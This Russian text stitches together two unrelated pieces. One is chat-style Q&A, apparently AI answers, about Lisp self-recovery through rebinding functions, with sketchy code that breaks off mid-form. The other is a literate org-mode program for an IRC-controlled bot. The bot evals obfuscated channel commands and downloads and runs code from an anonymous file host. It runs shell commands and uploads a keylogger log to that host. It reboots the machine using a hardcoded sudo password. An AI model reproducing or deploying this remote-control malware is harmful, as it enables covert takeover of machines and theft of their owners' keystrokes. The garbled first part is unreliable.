Для того чтобы программа, работающая в образе, могла сама восстанавливаться после сбоев и выбирать лучший вариант изменения графа привязок, необходимо добавить логику принятия решений в программу. Для этого можно использовать искусственный интеллект (например, машинное обучение) для анализа и предсказания возможных сценариев развития событий и выбора наиболее оптимального варианта действий.

Одним из способов добавления логики принятия решений может быть создание специальных макросов, которые будут отвечать за изменение графа переопределений функций и состояния переменных в зависимости от текущей ситуации. Например, можно создать макросы для автоматического отката изменений в графе при возникновении ошибок, либо для выбора оптимального варианта изменения графа в зависимости от предыдущего опыта работы программы.

Как программа работающая в образе может сама восстанавливаться после сбоев используя управление графом переопределений функций и состяния переменных? Как программа может принимать решение о изменении графа привязок и выбирать лучший вариант изменения графа в ответ на возникающие сбои?

Рассмотрим ситуацию, когда программа работающая в образе сталкивается с ошибкой. Для того, чтобы программа могла восстановиться после сбоев, можно использовать механизмы управления графом переопределений функций и состояния переменных.

Предположим, что программа обнаружила ошибку в работе какой-то функции. В этом случае, можно использовать макросы для отката к предыдущему определению функции или к предыдущему значению переменной. Затем, можно продолжить выполнение программы с использованием предыдущих определений функций и значений переменных.

Также, можно использовать механизмы ветвления и слияния переопределений функций и состояния переменных для выбора лучшего варианта изменения графа в ответ на возникающие сбои. Например, если в процессе выполнения программы обнаружилось, что новое определение функции привело к ошибке, можно использовать механизм ветвления для создания новой ветки графа переопределений функций, в которой будет использоваться предыдущее определение функции. Затем, можно использовать механизм слияния, чтобы выбрать лучший вариант изменения графа.

В общем, для того, чтобы программа могла принимать решение о изменении графа привязок и выбирать лучший вариант изменения графа в ответ на возникающие сбои, необходимо реализовать соответствующие механизмы в программе. Это могут быть механизмы ветвления и слияния графа переопределений функций и состояния переменных, а также механизмы автоматического отката к предыдущим определениям функций и значений переменных в случае ошибок. Кроме того, для эффективной работы с графом переопределений и состояния переменных можно использовать различные алгоритмы оптимизации и анализа, например, алгоритмы поиска путей в графе, алгоритмы оптимизации работы с памятью и др.

Напиши пример на Lisp который иллюстрирует эти подходы к самостоятельному восстановлению после сбоев с применением функций принятия решений и выбором лучшего варианта графа привязок

Допустим, у нас есть функция calculate, которая вычисляет результат на основе некоторых параметров. Мы хотим, чтобы программа могла автоматически восстанавливаться после сбоев, связанных с этой функцией, и выбирать лучший вариант изменения графа привязок.

Для этого мы можем создать несколько переопределений функции calculate и использовать механизмы ветвления и слияния, чтобы выбирать лучший вариант в зависимости от того, какой вариант работает лучше.

Кроме того, мы можем создать функцию принятия решений decision-fn, которая будет выбирать лучший вариант в зависимости от результата вычислений. Например, если результат слишком маленький, мы можем вернуть результат из другого варианта функции.

Код может выглядеть примерно так:

lisp

(defvar *calculate-versions* (list #'calculate-v1 #'calculate-v2))

(defun calculate ()
  (let ((results (mapcar #'funcall *calculate-versions*)))
    (decision-fn results)))

(defun decision-fn (results)
  (let ((best-result (car results)))
    (dolist (result (cdr results))
      (when (better-result-p result best-result)
        (setq best-result result)))
    best-result))

(defun better-result-p (result1 result2)
  (> (result-value result1) (result-value result2))))

Здесь мы определяем список версий функции calculate, затем вызываем каждую версию и передаем результаты в функцию принятия решений decision-fn. decision-fn выбирает лучший результат и возвращает его. Функция better-result-p сравнивает два результата и возвращает t, если первый результат лучше второго.

Также мы можем использовать макросы, описанные ранее, чтобы динамически изменять граф переопределений функций и состояний переменных в зависимости от результата вычислений и состояния программы.

-------------

я могу привести общий пример того, как программа может использовать граф переопределений и состояния переменных для самостоятельного восстановления после сбоев.

Предположим, у нас есть программа, которая должна обрабатывать большой объем данных и генерировать отчеты. В процессе работы программы могут возникать ошибки, связанные с недоступностью базы данных, отсутствием необходимых файлов или другими проблемами. Для того чтобы программа могла самостоятельно восстановиться после сбоев, мы можем использовать следующий подход:

    Разработать механизм отката к предыдущему состоянию графа переопределений и состояния переменных при возникновении ошибок. Это может быть реализовано, например, с помощью макросов, которые мы описывали ранее.

    Разработать функцию, которая будет принимать решение о том, как восстановиться после ошибки. Эта функция может основываться на различных критериях, таких как степень ущерба, причина ошибки, наличие резервных источников данных и т.д. Например, если ошибка связана с недоступностью базы данных, то функция может попытаться использовать альтернативный источник данных, если таковой имеется.

    Разработать механизм выбора лучшего варианта восстановления. Это может быть реализовано, например, с помощью системы весовых коэффициентов для разных альтернативных путей восстановления. Таким образом, программа сможет выбрать наиболее эффективный и безопасный способ восстановления после сбоя.

Например, в Lisp-подобном коде это может выглядеть следующим образом:

lisp

(defmacro with-rollback (&rest body)
  `(let* ((old-graph-func #'graph-func)
          (old-graph-vars #'graph-vars))
     (unwind-protect
         (progn ,@body)
       (setq graph-func old-graph-func)
       (setq graph-vars old-graph-vars))))

(defun handle-error (err)
  (case (error-type err)
    (:db-unavailable
     (if (db-backup-available-p)
         (progn (reconnect-to-backup-db)
                (setq graph-func (backup-graph-func))
                (setq graph-vars (backup-graph-vars)))
       (log-error

-------------_

Напиши пример на Lisp который иллюстрирует эти подходы к самостоятельному восстановлению после сбоев с применением функций принятия решений и выбором лучшего варианта графа привязок

К сожалению, я не могу написать полный пример на Lisp, который иллюстрирует все аспекты самостоятельного восстановления после сбоев с применением функций принятия решений и выбором лучшего варианта графа привязок, потому что это зависит от конкретной задачи и конкретного проекта. Однако, я могу привести пример сценария, в котором эти подходы могут быть применены.

Предположим, что у нас есть программа на Lisp, которая работает с большим объемом данных и периодически запускает вычисления, которые могут занять много времени. Для ускорения вычислений мы решаем распараллелить их, запуская несколько копий программы на разных процессорах. Каждый процесс работает со своим набором данных, но все они используют одинаковые функции и переменные.

Однако, из-за различий в данных, в одном из процессов может возникнуть сбой, который может привести к непредсказуемым результатам. Чтобы избежать этого, мы решаем реализовать механизм автоматического восстановления после сбоев.

Для этого мы расширяем наши макросы для работы с ветвлением и слиянием переопределений функций и состояния переменных, чтобы они могли принимать решения в зависимости от характера сбоя. Мы также реализуем функции принятия решений и выбора лучшего варианта графа привязок в ответ на сбой.

Например, мы можем использовать следующую функцию принятия решений:

lisp

(defun decide-what-to-do (error-type)
  "Decide what to do based on the type of error."
  (case error-type
    ((:division-by-zero :out-of-memory)
      (choose-another-branch))
    ((:inconsistent-data)
      (choose-another-merge))
    (t
      (signal 'unknown-error-type error-type))))

Функция decide-what-to-do принимает тип ошибки и возвращает решение о том, какой вариант графа привязок использовать для восстановления. Например, если ошибка связана с делением на ноль или нехваткой памяти, мы выбираем другую ветвь переопределения функций или состояния переменных. Если ошибка связана с несогласованностью данных, мы выбираем другой вариант слияния.

Напиши пример на Lisp который иллюстрирует эти подходы к самостоятельному восстановлению после сбоев с применением функций принятия решений и выбором лучшего варианта графа привязок.

Предположим, что у нас есть программа на Lisp, которая работает с большим объемом данных и периодически запускает вычисления, которые могут занять много времени. Для ускорения вычислений мы решаем распараллелить их, запуская несколько копий программы на разных процессорах. Каждый процесс работает со своим набором данных, но все они используют одинаковые функции и переменные.

Однако, из-за различий в данных, в одном из процессов может возникнуть сбой, который может привести к непредсказуемым результатам. Чтобы избежать этого, мы решаем реализовать механизм автоматического восстановления после сбоев.

По умолчанию мы считаем, что сбой возникает из-за некорректности данных. В этом случае мы должны использовать такую стратегию восстановления после сбоев:

1. Сохранить привязки данных, которые привели к сбою
2. Воспользоваться другими данными из другого источника
3. Если сбой не повторился - вызвать функцию анализа привязок функций, чтобы локализовать место где произошел сбой
4. Исправить соответствующи функции, что приведет к созданию новых привязок функций.
5. Воспользоваться новыми привязками функций для обработки старых данных - это потребует перепривязывания старых данных к новым функциям и перезапуска таймлайна
6. Если сбоев не произошло - поделиться изменениями привязок с другими узлами, чтобы предотвратить возможные сбои, если другие узлы тоже получат некорректные данные.

Пожалуйста напиши код на лисп, иллюстрирующий этот пример. Он должен содержать переопределение привязки функции, сигнализирование ошибки (condition), перехват ошибки обработчиком, в котором изменяется ранее переопределенная привяка функции и перепривязываются данные. В обработчике ошибки также должна быть вызвана процедура улучшения функции, которая вызвала ошибку, эта функция должна привязать улучшенную версию старой функции. Обработчик также должен перепривязать старые данные для новых функций, чтобы сделать прогон и убедиться в отсутствии ошибок.

* Channel Name

Мы будем использовать разные irc-каналы для коммуникации с разными абонентами - так их проще отлаживать по отдельности.

Для этого создадим функцию, которая будет определять имя канала при tangling-e

#+NAME: get_irc_channel_name
#+BEGIN_SRC elisp
  "nvrtlessfndout"
#+END_SRC

  "wntriscoming"

* File Destionation

Таким же образом мы будем танглить путь для сохранения файлов

#+NAME: get_dest_path
#+BEGIN_SRC elisp
  "tan"
#+END_SRC

  "wnt"
* Irc

Работа с IRC состоит из нескольких этапов
- Подключение
- Запуск цикла чтения сообщений
- Установка хука, чтобы перехватить сообщения-команды
- Подключение к каналу и отправка первого сообщения

После этого мы можем отпралять сообщения в канал, а когда другие сообщения будут приходить наш хук будет выполнен.

** Connect

Начнем с подключения к IRC - нашему коммуникационному каналу.

Если нет подключения к сети мы получим ошибку ~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но записана в лог, как и любые другие ошибки подключения. В этих случаях функция ~irc-loop~ не будет вызвана, произойдет выход их функции потока и поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит его и это приведет к следующей попытке подключения.

Если подключение произошло успешно - мы вызываем ~irc-loop~.

#+NAME: irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *irc-sess* nil) ;; (get-universal-time)
  (defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
  (defparameter *irc-serv* "irc.freenode.org")
  (defparameter *irc-chan* "#<<get_irc_channel_name()>>")
  (defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
  (defparameter *irc-conn* nil)

  <<irc_loop>>

  (defun irc ()
    "irc thread func"
    (setf *irc-sess* (get-universal-time))
    (setf *irc-user* (format nil "b~A" *irc-sess*))
    (setf *irc-conn*
          (handler-case
              (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *irc-conn*
      (dbg "::irc conn:~A~%" *irc-conn*)
      (setf *watchdog-timer* 0)
      (irc-loop)))
#+END_SRC

** Read loop

После успешного подключения мы запускаем цикл чтения сообщений из коммуникационного канала. В случае успеха этот поток будет зациклен в нем, поэтому здесь мы должны запустить вспомогательный поток ~irc-helper~, который установит нужные хуки

При временном отключении интернета внутри ~CL-IRC:READ-MESSAGE-LOOP~ может возникнуть ошибка ~SB-INT:SIMPLE-STREAM-ERROR~ с сообщением вида couldn't read from #<SB-SYS:FD-STREAM for "socket 192.168.0.102:50644, peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer

В этом случае нужно сделать реконнект. Чтобы его осуществить мы просто игнорируем ошибку, выведя её в лог и возвращая NIL. Это приводит к выходу из функции потока и супервизор запустит поток снова на следующем шаге.

Я временно отключил игнорирование ошибок, чтобы поймать их, если они произойдут. По идее все возможные ошибки перехватываются в местах их возникновения, если это не так - я увижу это, т.к. игнор отключен.

#+NAME: irc_loop
#+BEGIN_SRC lisp :noweb yes
  <<irc_helper>>

  (defun irc-loop ()
    (bt:make-thread
     #'irc-helper :name "irc-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*irc-sess* . ,*irc-sess*)
       (*irc-user* . ,*irc-user*)
       (*irc-serv* . ,*irc-serv*)
       (*irc-chan* . ,*irc-chan*)
       (*irc-lock* . ,*irc-lock*)
       (*irc-conn* . ,*irc-conn*)))
    (handler-case (cl-irc:read-message-loop *irc-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg "::irc-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

** Irc helper

После того как мы запустили цикл чтения сообщений следует подождать немного, чтобы успели дойти приветственные сообщения канала.

Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к каналу.

После этого мы считаем, что соединение корректно установлено, о чем сигнализируем установкой флага *connection-established-flag*

После этого можно отправить сообщение о присутствии.

Затем поток завершается - свою задачу он выполнил.

[TODO:gmm] По-видимому, вероятна ситуация, когда пропадает коннект в момент передачи сообщения в канал. В этом случае поток застревает в блокировке, не давая ее взять другим потокам. Я добавил ~recursive-lock~, но этого недостаточно. Полагаю, необходимо применение таймаутов на блокировку, но пока не могу придумать модельную ситуацию чтобы проверить это.

#+NAME: irc_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*irc-lock*)
       (handler-case
           (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
         (t (err)
           (dbg "::irc connect error: ~A~%" (type-of err))
           nil))))

  ;; irc-hook
  <<irc_hook>>

  (defun irc-helper ()
    (sleep 1)
    (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (cl-irc:join *irc-conn* *irc-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (setf *connection-established-flag* t))
    (sendmsg "hi"))
#+END_SRC

** Command hook

Определим функцию, которая будет обрабатывать сообщения, получаемые из irc-канала. Она должна возвращать T чтобы предотвратить дальнейшую обработку принятого сообщения.

#+NAME: irc_hook
#+BEGIN_SRC lisp :noweb yes
  ;; irc_cmd_proc
  <<irc_cmd_proc>>

  (defun irc-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *irc-cmd* param)
    (setf *watchdog-timer* 0)
    t)
#+END_SRC

У сообщения есть следующие поля:
- CL-IRC:SOURCE
- CL-IRC:USER
- CL-IRC:HOST
- CL-IRC:COMMAND
- CL-IRC:ARGUMENTS
- CL-IRC:CONNECTION
- CL-IRC:RECEIVED-TIME
- CL-IRC:RAW-MESSAGE-STRING

Из них нас интересует собственно команда размещенная в ~ARGUMENTS~. Мы прогоняем ее через функцию ~decode~, которая регуляркой разбивает команду на контрольную сумму (CRC32) и base64-кодированный код. Код расшифровывается с помощью ~decrypt~ и текущего ~seed~ а затем по нему вычисляется контрольная сумма. Если переданная контрольная сумма совпала с вычисленной - эта команда адресована нам, и мы ее выполняем.

#+NAME: irc_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; ecrypt
  <<encrypt>>

  ;; decrypt
  <<decrypt>>

  ;; encode
  <<encode>>

  ;; decode
  <<decode>>

  (defparameter *irc-cmd*
    (lambda (param)
      (block irc-cmd-block
        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
               (cmd (decode msg *irc-sess*)))
          (dbg "::MSG: [~A]~%" msg)
          (dbg "::CMD: [~A]~%" cmd)
          (finish-output)
          (unless (null cmd)
            (setf *watchdog-timer* 0)
            (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                            (t (err)
                              (dbg "::irc-cmd error: ~A~%" (type-of err))
                              (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                              (return-from irc-cmd-block nil)))))
              (setf *watchdog-timer* 0)
              (sendmsg "=> ~A" result)
              (dbg "::=> ~A~%" result)
              (finish-output)))))))

  ;; example of send encoded cmd
  ;; (encode "(print 1)" *irc-sess*)

  ;; example of wrong encoded cmd
  ;; (encode "(print 1)" (get-universal-time))
#+END_SRC

** Sequence XOR

#+NAME: seq_xor
#+BEGIN_SRC lisp
  (defun seq-xor (len seq-1 seq-2)
    (let ((result (make-array len :element-type '(unsigned-byte 8))))
      (do ((idx 0 (incf idx)))
          ((= idx len))
        (setf (aref result idx)
              (logxor (aref seq-1 idx)
                      (aref seq-2 idx))))
      result))
#+END_SRC

** Encrypt

#+NAME: encrypt
#+BEGIN_SRC lisp
  (defun encrypt (oct seed)
    (let* ((len (length oct))
           (gen (prbs:byte-gen 31 :seed seed))
           (gam (funcall gen len))
           (enc (seq-xor len oct gam)))
      (base64:usb8-array-to-base64-string enc)))
#+END_SRC

** Decrypt

#+NAME: decrypt
#+BEGIN_SRC lisp
  (defun decrypt (base64 seed)
    (let* ((oct (base64:base64-string-to-usb8-array base64))
           (gen (prbs:byte-gen 31 :seed seed))
           (len (length oct))
           (gam (funcall gen len)))
      (seq-xor len oct gam)))
#+END_SRC

** Encode

#+NAME: encode
#+BEGIN_SRC lisp
  (defun encode (cmd seed)
    (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
           (crc32   (ironclad:byte-array-to-hex-string
                     (ironclad:digest-sequence :crc32 oct)))
           (encoded (encrypt oct seed)))
      (format nil "s/~A/~A" crc32 encoded)))
#+END_SRC

** Decode

#+NAME: decode
#+BEGIN_SRC lisp
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))
#+END_SRC

* Update On Irc & Features

Чтобы удаленно расширять функциональность супервизора нам нужен способ обновить код. В блоке кода [[irc_cmd_proc][irc_cmd_proc]] раздела [[*Command hook][Command hook]] опредено, как узел может выполнить команду. Так что теперь мы должны написать процедуру, которая эту команду сформирует.

При этом мы ограничены размером IRC-сообщения, которое может быть не больше полукилобайта, поэтому сначала лучше закачать зашифрованное обновление на файлообменник и получить на него ссылку.

Эту задачу берет на себя процедура ~upload-code~, ей нужен код, (представленный как строка) и ключ, чтобы зашифровать код (т.к. мы не хотим чтобы файлобменник мог его прочитать).

Вызвать ~upload-code~ это задача оператора. ~upload-code~ возвращает ссылку на закачанный зашифрованный файл.

#+NAME: upload_code
#+BEGIN_SRC lisp :noweb yes
  (defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil "u-~A" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))

  ;; TEST for upload
  ;; (upload-code "(defun alfa () (print 1))" 1234567890)
  ;; /t1TaCeD1ne/u-3784605289
#+END_SRC

Теперь, когда есть ссылка, оператор может сформировать команду для отправки в irc-канал. Для этого он составляет из полученной на предыдущем этапе ссылки и ключа команду вида:

#+BEGIN_EXAMPLE
  "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)"
#+END_EXAMPLE

Но так как команда не посылается в канал в открытом виде - её надо зашифровать с помощью ~encode~

#+BEGIN_SRC lisp
  ;; (encode "(update \"/t1TaCeD1ne/u-3784605289\" 1234567890)" 3784752939)
  ;; => s/2953b20b/61gOM23BnHgQ+JFZnz7WxmlPOMmajHeB4N1efW+gmhVHdICEy2my4tNdK2algQ==
#+END_SRC

Полученную команду уже вполне можно посылать в канал и, если узел получил и выполнил команду, он вернет результат в канал, например так:

#+BEGIN_EXAMPLE
  <b3784752939> => "ALFA"
#+END_EXAMPLE

Мы можем обьединить закачку кода и отправку команды в одну операцию, для удобства:

#+NAME: upload_code_and_send
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; encrypt
  <<encrypt>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; upload_code
  <<upload_code>>

  ;; encode
  <<encode>>

  (defun upload-code-and-send (code key seed)
    (let* ((code-link (upload-code code key))
           (cmd (format nil "(update \"~A\" ~A)" code-link key))
           (enc (encode cmd seed)))
      (sendmsg enc)))

  ;; (upload-code-and-send "(alfa)" 1234567890 3784753813)
#+END_SRC

В этом тестовом примере узел должен выполнить ~ALFA~ и выдать в канал результат выполнения (число 1).

Чтобы все сработало, ~на узле~ нужно определить функцию ~UPDATE~, которая будет получать ссылку на файл с кодом, скачивать и расшифровывать его а потом применять:

#+NAME: update
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  (defun update (link key)
    (let* ((base64 (anon-file-download link))
           (oct    (decrypt base64 key))
           (cmd    (flex:octets-to-string oct :external-format :utf-8))
           (result (handler-case (bprint (eval (read-from-string cmd)))
                     (t (err)
                       (dbg "::irc-cmd error: ~A~%" (type-of err))
                       (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                       (return-from update nil)))))
      result))

  ;; (update "/3444C7Dbna/u-3784602724" 1234567890)
#+END_SRC

** File obtaining

Воспользуемся этим механизмом, чтобы сформировать какую-то новую функциональность, которая не была определена ранее. Например, попросим узел загрузить на файлообменник какой-нибудь файл.

Для этого надо определить процедуру, которую у оператора уже есть - ~upload-code~ (она определена в разделе выше). Но эта процедура не включена в код супервизора, исполняющийся на удаленной машине (поправка: в новом релизе - уже включена, но неважно). Эта процедура вызывает внутри себя ~encrypt~ и ~anon-file-upload~, которые уже на удаленном узле определены.

Чтобы отослать нам понадобится текущий ~seed~ получателя, который мы можем взять из его сообщений в канале и сохранить в переменную *receiver*. Также определим ключ, чтобы закрыть код от файлообменника.

Формируем строку и отсылаем:

#+BEGIN_SRC lisp
  (defparameter *receiver* 3785297487)
  (defparameter *tmpkey* 1234567890)

  (upload-code-and-send
   "(defun upload-code (code key)
    (let* ((oct (flex:string-to-octets code :external-format :utf-8))
           (base64 (encrypt oct key))
           (filename (format nil \"u-~A\" (get-universal-time)))
           (result   (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      link))"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный код на файлообменник и получить на него ссылку:

#+NAME: tester
#+BEGIN_SRC lisp
  (defparameter *receiver* 3785300360)
  (defparameter *tmpkey* 1234567890)

  ;; (upload-code-and-send
  ;;  (format
  ;;   nil
  ;;   "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
  ;;   *tmpkey*)
  ;;  *tmpkey*
  ;;  *receiver*)

  ;; (alexandria:write-string-into-file
  ;;  (download-and-decrypt "/T364z1F3n9/u-3785296327" *tmpkey*)
  ;;  "keylog3.log")
#+END_SRC

По этой ссылке скачать файл себе и расшировать его:

#+NAME: download_and_decrypt
#+BEGIN_SRC lisp
  (defun download-and-decrypt (link key)
    (flex:octets-to-string
     (decrypt
      (anon-file-download link)
      key)
     :external-format :utf-8))

  ;; (upload-code
  ;;  (alexandria:read-file-into-string "q.lisp\"")

  ;; (download-and-decrypt "/some/link" *tmpkey*)
#+END_SRC

** Replace yourself

Теперь выполним обратную операцию - загрузим файл на узел - например новую версию себя:

#+NAME: replace_yourself
#+BEGIN_SRC lisp :noweb yes
  <<download_and_decrypt>>

  (defun replace-yourself (link key)
    (alexandria:write-string-into-file
     (download-and-decrypt link key)
     "q.lisp" :if-exists :supersede)
    'ok)

  ;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
  ;; => "/some/file"

  ;; (defparameter *receiver* 3784783570)
  ;; (defparameter *tmpkey* 1234567890)

  ;; (upload-code-and-send
  ;;  "(replace-yourself \"/some/file\" 1234567890)"
  ;;  *tmpkey*
  ;;  *receiver*)
#+END_SRC

** Run program

Аналогичным образом добавляем возможность запускать команды на удаленном узле. Следует помнить, что запуск полностью синхронный, поэтому следует добавлять амперсанд (&) в конце команды, чтобы не ждать ее завершения.

#+NAME: shell_command
#+BEGIN_SRC lisp
  (defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

  (defparameter *bourne-compatible-shell* "/bin/sh"
    "The path to a Bourne compatible command shell in
  physical pathname notation.")

  (defun directory-pathname-p (pathname)
    "Does `pathname` syntactically  represent a directory?
    ---
    A directory-pathname is a pathname _without_ a filename. The three
    ways that the filename components can be missing are for it to be `nil`,
    `:unspecific` or the empty string.
    "
    (flet ((check-one (x)
             (not (null (member x '(nil :unspecific "")
                                :test 'equal)))))
      (and (check-one (pathname-name pathname))
           (check-one (pathname-type pathname)))))

  (defmacro with-gensyms (syms &body body)
    `(let ,(mapcar #'(lambda (s)
                       `(,s (gensym)))
                   syms)
       ,@body))

  (defmacro with-stream-from-specifier ((stream)
                                        &body body)
    (with-gensyms (s close? result)
      `(let ((,close? t)
             ,s
             ,result)
         (unwind-protect
              (setf ,result
                    (multiple-value-list
                     (let (,stream)
                       (setf (values ,s ,close?)
                             nil)
                       (setf ,stream ,s)
                       ,@body)))
           (when (and ,close? ,s)
             (let ((it (close-stream-specifier ,s)))
               (when it
                 (setf (first ,result) it)))))
         (values-list ,result))))

  (defmacro with-input ((var) &body body)
    "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
    `(with-stream-from-specifier (,var)
       ,@body))

  (defun close-stream-specifier (s)
    (if (equal (type-of s) 'string-stream)
        (prog1
            (values (get-output-stream-string s))
          (close s))
        ;; else
        (progn
          (close s)
          (values nil))))

  (defun file-to-string-as-lines (stream)
    (with-output-to-string (s)
      (loop for line = (read-line stream nil :eof nil)
         until (eq line :eof) do
           (princ line s)
           (terpri s))))

  (defun %shell-command (command)
    (with-input (input-stream)
      (let* ((process (sb-ext:run-program
                       ,*bourne-compatible-shell*
                       (list "-c" command)
                       :wait nil :input input-stream
                       :output :stream
                       :error :stream))
             (output-thread (sb-thread:make-thread
                             #'(lambda ()
                                 (file-to-string-as-lines
                                  (sb-impl::process-output process)))))
             (error-thread (sb-thread:make-thread
                            #'(lambda ()
                                (file-to-string-as-lines
                                 (sb-impl::process-error process))))))
        (let ((error-code
               (sb-impl::process-exit-code (sb-impl::process-wait process)))
              (output-string (sb-thread:join-thread output-thread))
              (error-string (sb-thread:join-thread error-thread)))
          (close (sb-impl::process-output process))
          (close (sb-impl::process-error process))
          (values output-string error-string error-code)))))

  (defun find-command-ending-in-string (command)
    (let ((checking? t))
      (loop for ch across command
         for i from 0 do
           (cond ((and checking? (char= ch #\Space))
                  (return i))
                 ((char= ch #\\)
                  (setf checking? nil))
                 (t
                  (setf checking? t))))))


  (defun shell-command (command)
    "Synchronously execute `command` using a Bourne-compatible shell,
     returns (values output error-output exit-status).
     --
     The `command` can be a full path to a shell executable binary
     or just its name. In the later case, the variable `*shell-search-paths*`
     will be used to find the executable.
     --
     Depending on the implementation, the variable `*bourne-compatible-shell*`
     may be used to find a shell to use in executing `command`."
    (let* ((pos-/ (position #\/ command))
           (pos-space (find-command-ending-in-string command))
           (binary (subseq command 0 (or pos-space)))
           (args (and pos-space (subseq command pos-space))))
      (when (or (not pos-/)
                (and pos-/ pos-space)
                (and pos-space
                     (< pos-/ pos-space)))
        ;; no slash in the command portion, try to find the command with
        ;; our path
        (setf binary
              (or (loop for path in *shell-search-paths* do
                       (let ((full-binary (make-pathname :name binary
                                                         :defaults path)))
                         (when (and (probe-file full-binary)
                                    (directory-pathname-p full-binary))
                           (return full-binary))))
                  binary)))
      (multiple-value-bind (output error status)
          (%shell-command (format nil "~a~@[ ~a~]" binary args))
        (values output error status))))
#+END_SRC

Тут приведен пример запуска, написанный в расчете на то, что предыдущий блок упакован в строку, размещенную в переменной ~*CODE*~.

Также есть примеры запуска на удаленном узле
- броузера (как пример GUI-программы которая есть везде)
- команды которая используется, чтобы понять, запущен ли броузер (она
  подсчитывает процессы с именами "firefox")
- закрытия броузера (как пример завершения процессов, запущенных
  асинхронно)
- проверки определена ли процедура (так можно определять, какие features
  поддерживаются в этой инсталляции супервизора узла в текущий момент)
- удаления определения процедуры (оно необходимо, т.к. без него
  переопределение ловится процедурой игнорирования ошибки)

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784780565)

  (defparameter *tmpkey* 3784780565)

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(uiop:run-program \"firefox &\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ps aux | grep firefox | wc -l\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"killall firefox\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(fboundp 'shell-command)"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(setf *sleep-interval* 300)"
   ,*tmpkey*
   ,*receiver*)



  (upload-code-and-send
   "(fmakunbound 'shell-command)"
   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Shutdown

Чтобы выполнить перезагрузку воспользуемся ~EXPECT~. Скрипт будет таким:

#+NAME:
#+BEGIN_SRC tcl
  #!/usr/bin/expect -d
  spawn sudo reboot
  sleep 3
  expect {\[sudo\] ?assword* }
  send "rfhfrfnbwf\r"
  sleep 3
#+END_SRC

Вот последовательность команд, которую нужно исполнить, чтобы загрузить и выполнить скрипт перезагрузки на узле. Следует помнить, что после перезагрузки узел не выйдет в сеть, если на нем не установлен автологин.

#+BEGIN_SRC lisp
  (defparameter *receiver* 3784776109)

  (defparameter *tmpkey* 1234567890)

  (defparameter *code*
    "(alexandria:write-string-into-file
     \"#!/usr/bin/expect -d
     spawn sudo reboot
     sleep 3
     expect {\\[sudo\\] ?assword* }
     send \\\"rfhfrfnbwf\\\\r\\\"
     sleep 3
     \"
     \"rbt.sh\" :if-exists :supersede)
  ")

  (upload-code-and-send
   ,*code*
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"ls -la| grep rbt\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"chmod +x rbt.sh\")"
   ,*tmpkey*
   ,*receiver*)

  (upload-code-and-send
   "(shell-command \"./rbt.sh\")"
